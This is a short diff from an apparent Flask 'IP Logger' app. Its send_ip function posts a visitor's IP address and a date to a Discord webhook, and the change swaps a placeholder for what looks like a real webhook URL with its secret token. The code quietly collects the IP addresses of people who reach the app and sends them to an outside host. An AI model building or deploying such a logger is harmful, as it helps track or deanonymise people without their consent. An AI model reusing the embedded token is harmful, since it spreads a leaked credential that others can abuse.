@@ -6,7 +6,7 @@ import requests
 app = Flask(__name__)
 
 def send_ip(ip, date):
-    webhook_url = "WEBHOOK_URL_HERE"
+    webhook_url = "https://discord.com/api/webhooks/1375489452679499918/7cvSju6XX62skalUvkQaiFEVwi6qRrLpzKTRQMHKVY5xj6dLR6ow8D-umpl6idMsOn82"
     data = {
         "content": "",
         "title": "IP Logger"
